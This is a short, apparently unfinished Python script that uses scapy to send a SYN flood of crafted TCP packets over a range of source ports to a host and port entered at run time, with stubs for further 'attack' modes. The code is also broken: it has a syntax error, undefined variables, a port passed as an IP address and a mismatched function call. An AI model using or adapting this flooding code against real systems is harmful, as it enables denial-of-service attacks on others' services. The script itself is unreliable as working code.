import socket
from threading import Thread
from scapy.all import *

data_size = 1020  # number of bytes per transmission being sent
con_num = 10  # number of connections to the host
counter = 1000  # number of messages to send of size: data_size

def syn_attack(scap):

    # print('Thread - ' + sock.getsockname() + ' Executing syn #attack')
    for c in range(1024, 65535):
        dest = IP(src=t_host, dst=t_port))
        source = TCP(sport=c, dport = 1393)
        pack = dest/source
        send(pack)

def data_attack(self):
    pass

def all_in(self):
    pass

#def run(self):
#    while a in range(con_num):
#        (target=syn_attack())
 
def Main():
    # host = str(input('Host: '))
    r_port = int(input('Port: '))
    r_host = '127.0.0.1'
    #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # s.connect((host,port))
    #s.dup(s, host, port)
    #one.start()
    #one.close()
    # here it would be a reverse of sent message

    syn_attack(0, r_host, r_port)

if __name__ == '__main__':
    Main()